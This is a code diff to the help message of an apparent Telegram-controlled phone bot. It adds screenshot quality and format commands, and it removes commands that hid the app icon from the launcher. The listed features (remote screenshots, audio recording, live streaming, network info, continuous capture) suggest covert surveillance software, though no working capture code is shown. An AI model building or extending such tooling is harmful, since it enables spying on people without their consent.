@@ -74,7 +74,6 @@ async function sendTelegramMessage(chatId, text) {
 }
 
 // ============= COMMAND HELPERS =============
-
 function getHelpMessage() {
     return `<b>🤖 COMPLETE COMMAND LIST</b>
 
@@ -85,8 +84,20 @@ function getHelpMessage() {
 /storage - Get storage information
 /network - Get network info (IP, WiFi, Mobile)
 
-<b>📸 MEDIA COMMANDS</b>
+<b>📸 SCREENSHOT COMMANDS</b>
 /screenshot - Take a screenshot NOW
+/screenshot_settings - View current screenshot settings
+/quality_low - Set screenshot quality to 30%
+/quality_medium - Set screenshot quality to 60% (default)
+/quality_high - Set screenshot quality to 85%
+/quality_original - Set screenshot quality to 100%
+/format_jpeg - Save screenshots as JPEG (smaller files)
+/format_png - Save screenshots as PNG (lossless)
+/format_webp - Save screenshots as WebP (modern format)
+/resize_on [width] - Enable resize to specified width (default 800px)
+/resize_off - Disable resize
+
+<b>🎤 RECORDING COMMANDS</b>
 /record - Start 60s audio recording NOW
 /stream_start - Start live streaming
 /stream_stop - Stop live streaming
@@ -126,14 +137,14 @@ function getHelpMessage() {
 <b>📋 QUICK REFERENCE</b>
 • Just /record - Quick 60s recording
 • Just /screenshot - Quick screenshot
+• /quality_low - Reduce screenshot size
 • /start_recording - Enable continuous scheduled recording
 • /start_screenshot - Enable continuous screenshot service
 • /reboot_app - Restart all services
-• /hide_icon - Hide app from launcher
-• /show_icon - Show app in launcher
 
 For more help, visit the dashboard at http://127.0.0.1:8080`;
 }
+
 
 // ============= WEBHOOK ENDPOINT =============
 
